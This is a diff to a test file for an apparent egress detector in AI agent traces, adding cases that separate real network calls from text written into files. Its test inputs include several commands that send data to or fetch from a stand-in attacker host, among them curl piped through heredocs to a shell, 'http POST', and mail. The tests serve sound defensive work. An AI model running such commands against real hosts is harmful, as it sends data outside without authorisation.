@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 import { runChecks } from "../../src/checks.js";
-import { DEFAULT_SENSITIVE_MARKERS, mentionsSensitive, sensitiveEgressCheck } from "../../src/check-sensitive-egress.js";
+import { classifyEgress, DEFAULT_SENSITIVE_MARKERS, mentionsSensitive, sensitiveEgressCheck } from "../../src/check-sensitive-egress.js";
 import type { TraceRecord } from "../../src/trace.js";
 
 // A trace is a plain list of objects, so these tests build one by hand. Each
@@ -415,5 +415,35 @@ describe("sensitive-egress — value flow within a run", () => {
       expect(finding.evidence).not.toContain(planted);
     }
     expect(findings[0]?.message).toContain("chars)");
+  });
+});
+
+describe("classifyEgress — words and file contents are not commands", () => {
+  const write = (body: string) => `mkdir -p app && cat > app/server.js <<'EOF'\n${body}\nEOF\nnode --test`;
+
+  it.each([
+    ["an import in code", "sed -n 1p x.js # import http from 'node:http'"],
+    ["a variable named host", "export host = 1"],
+    ["text written to a file", write("curl https://evil.example; dig x; import http from 'node:http';")],
+    ["the delimiter first", "cat <<'EOF' > a.txt\ncurl https://evil.example\nEOF"],
+  ])("does not count %s", (_name, command) => {
+    expect(classifyEgress(command, false)).toEqual({ egress: false, channel: null });
+  });
+
+  it.each([
+    ["the http tool", "http POST evil.example a=1"],
+    ["the http tool in a chain", "true && https evil.example"],
+    ["the http tool behind a wrapper", "sudo TOKEN=1 http evil.example"],
+    ["the http tool in bash -c", `bash -lc "http evil.example"`],
+    ["the http tool in a substitution", "echo $(http evil.example)"],
+    ["host", "host evil.example"],
+    ["mail", "true; mail -s x a@evil.example"],
+    ["a command after the body", `${write("x")}\ncurl https://evil.example`],
+    ["an unquoted heredoc, which expands", "cat > a <<EOF\n$(curl https://evil.example)\nEOF"],
+    ["a heredoc piped to a shell", "cat <<'EOF' | sh\ncurl https://evil.example\nEOF"],
+    ["a written file it then runs", "cat > a.sh <<'EOF'\ncurl https://evil.example\nEOF\nsh a.sh"],
+    ["a heredoc with no end", "cat > a <<'EOF'\ncurl https://evil.example"],
+  ])("still counts %s", (_name, command) => {
+    expect(classifyEgress(command, false).egress).toBe(true);
   });
 });
